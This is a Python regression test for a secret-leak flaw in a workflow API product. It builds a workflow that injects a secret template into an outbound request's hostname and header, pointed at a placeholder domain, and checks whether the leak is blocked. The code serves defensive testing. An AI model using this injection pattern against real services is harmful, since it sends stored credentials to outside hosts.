"""PoC #3: Template injection / secret leak via {{secrets.X}} — regression assertion.

After fix: using {{secrets.X}} in a URL must be blocked with an error mentioning
"secret in url" or similar.  The secret value must never appear in outbound requests.
Before fix: the substitution happens silently and the request is attempted.

Usage:
    python poc_secret_sub.py --expected=blocked     # default: assert secret-in-URL blocked
    python poc_secret_sub.py --expected=vulnerable  # assert secret substitution works
"""

import argparse
import json
import os
import sys
import time
import urllib.request

SESSION = os.environ.get("APIWEAVE_SESSION")
CSRF = os.environ.get("APIWEAVE_CSRF")


def req(base, method, path, body=None):
    url = base + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Cookie", f"session={SESSION}; csrftoken={CSRF}")
    r.add_header("Content-Type", "application/json")
    if method in ("POST", "PUT", "PATCH", "DELETE"):
        r.add_header("X-CSRF-Token", CSRF)
    try:
        resp = urllib.request.urlopen(r, timeout=15)
        return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"null")
    except Exception as e:
        return 0, {"error": str(e)}


def main():
    parser = argparse.ArgumentParser(description="Secret substitution PoC regression assertion")
    parser.add_argument(
        "--expected",
        choices=["blocked", "vulnerable"],
        default="blocked",
        help="Expected outcome: 'blocked' (post-fix) or 'vulnerable' (pre-fix)",
    )
    parser.add_argument(
        "--base-url",
        default=os.environ.get("APIWEAVE_BASE_URL", "http://127.0.0.1:8000"),
        help="Backend base URL (default: $APIWEAVE_BASE_URL or http://127.0.0.1:8000)",
    )
    args = parser.parse_args()
    BASE = args.base_url.rstrip("/")
    expected = args.expected

    if not SESSION or not CSRF:
        print("SKIP: Set APIWEAVE_SESSION and APIWEAVE_CSRF env vars")
        sys.exit(0)

    results = []  # (test_name, passed, detail)
    evidence_lines = [f"poc_secret_sub.py — expected={expected}\nbase_url={BASE}\n\n"]

    # Step 1: create an environment with a known secret
    print("[*] Creating environment with secret 'auditSecret' = 'AUDIT-SECRET-XYZ-9999'")
    code, env = req(
        BASE,
        "POST",
        "/api/environments",
        {
            "name": "audit-env",
            "description": "Security audit environment",
            "variables": {"baseUrl": BASE},
            "secrets": {"auditSecret": "AUDIT-SECRET-XYZ-9999"},
        },
    )
    print(
        f"[+] environment: HTTP {code} id={env.get('environmentId') if isinstance(env, dict) else env}"
    )
    if code not in (200, 201):
        print(json.dumps(env, indent=2))
        sys.exit(2)
    env_id = env["environmentId"]

    # Step 2: create a workflow that uses {{secrets.auditSecret}} in URL
    print("\n[*] Creating workflow that puts secret in URL")
    wf = {
        "name": "Secret Sub PoC",
        "environmentId": env_id,
        "nodes": [
            {
                "nodeId": "s",
                "type": "start",
                "label": "Start",
                "position": {"x": 0, "y": 0},
                "config": {},
            },
            {
                "nodeId": "h",
                "type": "http-request",
                "label": "Probe",
                "position": {"x": 100, "y": 0},
                "config": {
                    "method": "GET",
                    "url": "http://{{secrets.auditSecret}}.example.invalid/",
                    "headers": "X-Audit-Secret: {{secrets.auditSecret}}",
                    "body": "",
                    "bodyType": None,
                    "timeout": 3,
                },
            },
            {
                "nodeId": "e",
                "type": "end",
                "label": "End",
                "position": {"x": 200, "y": 0},
                "config": {},
            },
        ],
        "edges": [
            {"edgeId": "e1", "source": "s", "target": "h"},
            {"edgeId": "e2", "source": "h", "target": "e"},
        ],
    }
    code, w = req(BASE, "POST", "/api/workflows", wf)
    print(f"[+] workflow: HTTP {code}")
    if code not in (200, 201):
        print(json.dumps(w, indent=2))
        req(BASE, "DELETE", f"/api/environments/{env_id}")
        sys.exit(3)
    wid = w["workflowId"]
    code, run = req(BASE, "POST", f"/api/workflows/{wid}/run", {})
    rid = run.get("runId")
    for _ in range(15):
        time.sleep(0.5)
        code, status = req(BASE, "GET", f"/api/workflows/{wid}/runs/{rid}")
        if status.get("status") in ("completed", "failed"):
            break

    print(f"\n[*] Run status: {status.get('status')}")

    # Read log
    log_text = ""
    log = f"logs/run_{rid}.log"
    if os.path.exists(log):
        with open(log, encoding="utf-8") as f:
            log_text = f.read()
        for keyword in [
            "AUDIT-SECRET-XYZ-9999",
            "Substituting",
            "Processing variable",
            "secrets.auditSecret",
            "Resolved secret",
            "secret in url",
            "blocked",
            "forbidden",
        ]:
            if keyword in log_text:
                start = max(0, log_text.find(keyword) - 150)
                end = min(len(log_text), log_text.find(keyword) + 400)
                safe = log_text[start:end].encode("ascii", "replace").decode()
                print(f"  -- context '{keyword}': --")
                for ln in safe.splitlines():
                    print("  " + ln)

    # Step 3: check node result
    code, res = req(BASE, "GET", f"/api/workflows/{wid}/runs/{rid}/nodes/h/result")
    result = res.get("result", {}) if isinstance(res, dict) else res
    result_json = json.dumps(result)
    print(
        f"\n[*] Node result status: {result.get('status') if isinstance(result, dict) else 'N/A'}"
    )
    print(json.dumps(result, indent=2)[:2000])

    evidence_lines.append(f"Run status: {status.get('status')}\n\n")
    evidence_lines.append(f"Log text (first 4000 chars):\n{log_text[:4000]}\n\n")
    evidence_lines.append(f"Node result:\n{result_json[:2000]}\n\n")

    # Cleanup
    req(BASE, "DELETE", f"/api/workflows/{wid}")
    req(BASE, "DELETE", f"/api/environments/{env_id}")

    # --- Assertions ---
    result_status = result.get("status", "") if isinstance(result, dict) else ""
    result_error = str(result.get("error", "")) if isinstance(result, dict) else ""

    # Check for secret-in-URL blocking
    secret_in_url_blocked = any(
        kw in result_error.lower()
        for kw in [
            "secret in url",
            "secret in the url",
            "secrets in url",
            "secret substitution",
            "secret.*url",
            "disallowed",
            "blocked",
            "forbidden",
            "not allowed",
        ]
    )
    # Also check log for blocking
    log_has_block = any(
        kw in log_text.lower()
        for kw in [
            "secret in url",
            "secret in the url",
            "secrets in url",
            "secret substitution.*blocked",
            "disallowed",
        ]
    )

    # Check if secret value leaked in result
    secret_leaked = "AUDIT-SECRET-XYZ-9999" in result_json

    if expected == "blocked":
        # PASS if: node result error mentions secret-in-url blocking, OR result is error
        if secret_in_url_blocked or log_has_block or result_status == "error":
            detail = (
                f"secret_in_url_blocked={secret_in_url_blocked or log_has_block}, "
                f"result_status={result_status}"
            )
            if result_error:
                detail += f", error={result_error[:120]}"
            results.append(("Secret in URL blocked", True, detail))
        else:
            results.append(
                (
                    "Secret in URL blocked",
                    False,
                    f"Expected error about secret-in-URL but got status={result_status}, error={result_error[:120]}",
                )
            )

        # Additional: secret value must NOT appear in result
        if not secret_leaked:
            results.append(
                ("Secret value not in result", True, "Secret value masked/absent from node result")
            )
        else:
            results.append(
                ("Secret value not in result", False, "SECRET VALUE PRESENT IN NODE RESULT — leak!")
            )

    else:  # vulnerable
        # PASS if: substitution happened (no error about secret-in-URL)
        if not secret_in_url_blocked and not log_has_block:
            results.append(
                (
                    "Secret substitution works (vulnerable)",
                    True,
                    f"No blocking error — substitution proceeded, status={result_status}",
                )
            )
        else:
            results.append(
                (
                    "Secret substitution works (vulnerable)",
                    False,
                    f"Expected substitution to proceed but got blocking error: {result_error[:120]}",
                )
            )

    # --- Report ---
    print("\n" + "=" * 60)
    print("ASSERTION RESULTS")
    print("=" * 60)
    all_pass = True
    for name, passed, detail in results:
        tag = "PASS" if passed else "FAIL"
        if not passed:
            all_pass = False
        print(f"  [{tag}] {name}")
        print(f"         {detail}")

    # Save evidence
    evidence_path = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        ".omo",
        "evidence",
        "task-6-poc-secret-sub.txt",
    )
    try:
        os.makedirs(os.path.dirname(evidence_path), exist_ok=True)
        with open(evidence_path, "w", encoding="utf-8") as f:
            f.writelines(evidence_lines)
            f.write("Assertions:\n")
            for name, passed, detail in results:
                f.write(f"  [{'PASS' if passed else 'FAIL'}] {name}: {detail}\n")
            f.write(f"\nOverall: {'PASS' if all_pass else 'FAIL'}\n")
        print(f"\n[*] Evidence saved to {evidence_path}")
    except Exception as e:
        print(f"[!] Could not save evidence: {e}")

    sys.exit(0 if all_pass else 1)


if __name__ == "__main__":
    main()
